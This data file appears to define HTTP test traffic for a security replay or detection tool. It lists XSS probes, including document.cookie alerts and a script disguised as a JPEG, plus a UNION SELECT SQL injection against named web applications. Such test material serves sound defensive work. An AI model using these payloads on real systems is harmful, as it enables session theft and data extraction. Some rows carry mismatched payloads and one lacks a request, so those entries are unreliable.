﻿easy-content_xss.xml,Easy-Content Forums 1.0 XSS Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing HTML or Javascript. Easy-Content Forums is a web application that typically listens on port 80.""",HTTP,TCP,GET /topics.asp?catid=30&forumname=||22 ||><script>alert('X')||3B ||</script>||22 ||><script>alert('X')||3B ||</script> HTTP/1.0||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Host||3A || www.victims.com||0D 0A ||Connection||3A || close||0D 0A 0D 0A||
easy-content_xss.xml,Easy-Content Forums 1.0 XSS Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing HTML or Javascript. Easy-Content Forums is a web application that typically listens on port 80.""",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿efiction_xss_a.xml,eFiction XSS Vulnerabilities,This threat sends a crafted URL that contains Javascript which is included in the returned page. eFiction is an web application that typically listens on port 80.,HTTP,TCP,POST /efiction/titles.php?action=viewlist&let=<script>alert(document.cookie)</script> HTTP/1.0||0D 0A 0D 0A||
efiction_xss_a.xml,eFiction XSS Vulnerabilities,This threat sends a crafted URL that contains Javascript which is included in the returned page. eFiction is an web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿efiction_xss_b.xml,eFiction XSS and SQL Insertion,"This threat sends a crafted URL that contains Javascript which is included in the returned page, as well as an SQL statement that is executed by the server. eFiction is an web application that typically listens on port 80.",HTTP,TCP,"POST /efiction/titles.php?action=viewlist&let='%20UNION%20SELECT%200,0,'<script>alert(document.cookie)</script>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/* HTTP/1.0||0D 0A 0D 0A||"
efiction_xss_b.xml,eFiction XSS and SQL Insertion,"This threat sends a crafted URL that contains Javascript which is included in the returned page, as well as an SQL statement that is executed by the server. eFiction is an web application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿flexwatch_xss.xml,FlexWATCH Network Camera Cross-Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in FlexWATCH Network Camera. This can allow an attacker to steal session and cookie information.FlexWATCH Network Camera is a web application, and will typically listen on port 80",HTTP,TCP,GET /%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1||0D 0A ||HOST||3A || www.netcamera.com||0D 0A ||User-Agent||3A || Elinks (0.11.1||3B || Linux 2.2 i386||3B ||152x25)||0D 0A ||Referer||3A ||http||3A ||//www.netcamera.com/main.html||0D 0A ||Accept||3A || */*||0D 0A ||Accept-Encoding||3A || gzip||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||
flexwatch_xss.xml,FlexWATCH Network Camera Cross-Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in FlexWATCH Network Camera. This can allow an attacker to steal session and cookie information.FlexWATCH Network Camera is a web application, and will typically listen on port 80",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿fusebox_xss.xml,Fusebox Cross Site Scripting Attack,"This threat recreates a cross site scripting condition in ColdFusion Fusebox.  This can allow an attacker to steal session and cookie information.  Fusebox is a web application, and will typically listen on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿guestbook_xss.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,GET /form.php?action=show&homepage=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]&mail=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]&name=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]  HTTP 1.0||0D 0A 0D 0A||
guestbook_xss.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿guestbook_xss_b.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,GET /admin/header.php?language=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]&anzeigebreite=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]  HTTP 1.0||0D 0A 0D 0A||
guestbook_xss_b.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿guestbook_xss_c.xml,Toms Guestebuch  1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,GET install.php?msg=<script>alert(||22 ||pwnt||22 ||)||3B ||</script>  HTTP 1.0||0D 0A 0D 0A||
guestbook_xss_c.xml,Toms Guestebuch  1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿hivemail_xss.xml,HiveMail XSS Vulnerability,This threat is an example of a cross-site scripting attack where the code is injected via the HiveMail index.php. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /index.php/%22%3E%3Cscript%3Ealert(document.cookie)||3B ||%3C/script%3E  HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
hivemail_xss.xml,HiveMail XSS Vulnerability,This threat is an example of a cross-site scripting attack where the code is injected via the HiveMail index.php. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿host_xss.xml,HTTP Host XSS,"This threat sends a Javascript alert through the Host: field of an HTTP packet.  Some webservers will echo this input back out the web browser, creating the possibility of a cross-site scripting attack.",HTTP,TCP,GET / HTTP/1.1||0D 0A ||Host||3A || <script>alert('1mp3rf3ctr0x')||3B ||</script>||0D 0A 0D 0A||
host_xss.xml,HTTP Host XSS,"This threat sends a Javascript alert through the Host: field of an HTTP packet.  Some webservers will echo this input back out the web browser, creating the possibility of a cross-site scripting attack.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ideocontent_xss.xml," IdeoContent Manager news_full.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,"GET /news_full.php?&page=2||22 ||><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux x86_64||3B || en-US||3B || rv||3A ||1.7.12) Gecko/20051020 Epiphany/1.8.2||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300..Connection||3A || keep-alive..Cache-Control||3A || max-age=0||0D 0A 0D 0A||"
ideocontent_xss.xml," IdeoContent Manager news_full.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ideocontent_xss_b.xml," IdeoContent Manager Index.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,"GET /news_full.php?&page=2||22 ||><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux x86_64||3B || en-US||3B || rv||3A ||1.7.12) Gecko/20051020 Epiphany/1.8.2||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300..Connection||3A || keep-alive..Cache-Control||3A || max-age=0||0D 0A 0D 0A||"
ideocontent_xss_b.xml," IdeoContent Manager Index.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ie7_jpg_xss.xml,IE7 Malformed Image XSS,This threat causes Internet Explorer 7 and 6 to execute javascript nested inside of a malformed image.  This can allow malicious hackers to poison websites where users are allowed to upload pictures.  This attack would come from a webserver on port 80.,HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
ie7_jpg_xss.xml,IE7 Malformed Image XSS,This threat causes Internet Explorer 7 and 6 to execute javascript nested inside of a malformed image.  This can allow malicious hackers to poison websites where users are allowed to upload pictures.  This attack would come from a webserver on port 80.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Thu, 26 Oct 2006 19||3A ||23||3A ||56 GMT||0D 0A ||Server||3A || Apache/1.3.33 (Unix)||0D 0A ||Last-Modified||3A || Wed, 25 Oct 2006 22||3A ||47||3A ||44 GMT||0D 0A ||ETag||3A || ||22 ||33d8284-73-453fe990||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 115||0D 0A ||Content-Type||3A || image/jpeg||0D 0A 0D 0A ||GIF89a||01 00 01 00 ||<HTML><HEAD><SCRIPT>alert('Congrats for using a browser that is proven to suck!')||3B ||</SCRIPT></HEAD></HTML>"
﻿litespeed_xss.xml,LiteSpeed ConfMgr.php Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript to be included  in the returned page. LiteSpeed Webserver is a web application that typically listens on port 80.,HTTP,TCP,GET /admin/config/confMgr.php?m=al_adminListener%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.0||0D 0A 0D 0A||
litespeed_xss.xml,LiteSpeed ConfMgr.php Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript to be included  in the returned page. LiteSpeed Webserver is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿mailsite_xss.xml," Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90.,HTTP,TCP,"POST /efiction/titles.php?action=viewlist&let='%20UNION%20SELECT%200,0,'<script>alert(document.cookie)</script>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/* HTTP/1.0||0D 0A 0D 0A||"
mailsite_xss.xml," Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿miniwebshop_xss.xml,Mini Web Shop View.PHP Viewcategory.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the View.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Mini Web Shop is a web application, and typically listens on port 80.
",HTTP,TCP,GET /miniwebshop/modules/viewcategory.php?catname='><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
miniwebshop_xss.xml,Mini Web Shop View.PHP Viewcategory.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the View.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Mini Web Shop is a web application, and typically listens on port 80.
",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ned_xss.xml,Nokia Electronic Documentation Cross Site Scripting,This threat attempts to cause a cross site scripting attack on a Nokia Electronic Documentation web server.  Can be used to execute Javascript with the user's permissions on the website they are viewing. ,HTTP,TCP,GET /docs/<script>alert('1mp3rf3ctR0x')||3B ||</script> HTTP/1.0||0D 0A 0D 0A||
ned_xss.xml,Nokia Electronic Documentation Cross Site Scripting,This threat attempts to cause a cross site scripting attack on a Nokia Electronic Documentation web server.  Can be used to execute Javascript with the user's permissions on the website they are viewing. ,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿netgear_xss.xml,Netgear URL Filter Cross-Site Scripting Injection,"This threat sends a URL request for a file that should be filtered by a Netgear router.  The Netgear router in this instance will filter the request, block the URL, and enter an entry into its log.  However, this entry can be used as a vector of attack with cross site scripting injection.  When the log is later viewed by a user, the Javascript is executed with the privileges of the logged in user.",HTTP,TCP,GET /malware.exe</textarea><script>alert('imperfectRox')</script> HTTP/1.0||0D 0A 0D 0A||
netgear_xss.xml,Netgear URL Filter Cross-Site Scripting Injection,"This threat sends a URL request for a file that should be filtered by a Netgear router.  The Netgear router in this instance will filter the request, block the URL, and enter an entry into its log.  However, this entry can be used as a vector of attack with cross site scripting injection.  When the log is later viewed by a user, the Javascript is executed with the privileges of the logged in user.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿netgear_xss2.xml,Netgear URL Logging XSS,This threat sends a cross-site scripting attempt to a third party webpage.  The netgear URL filter logging process then places this output unfiltered in its log webpage.  This allows an attacker to execute arbitrary javascript with permissions of the administrator viewing the page.  This threat targets a webserver listening on port 80.,HTTP,TCP,GET / HTTP/1.0||0D 0A ||Host||3A || </textarea><script>alert('XSS!blabla')||3B 0D 0A 0D 0A||
netgear_xss2.xml,Netgear URL Logging XSS,This threat sends a cross-site scripting attempt to a third party webpage.  The netgear URL filter logging process then places this output unfiltered in its log webpage.  This allows an attacker to execute arbitrary javascript with permissions of the administrator viewing the page.  This threat targets a webserver listening on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
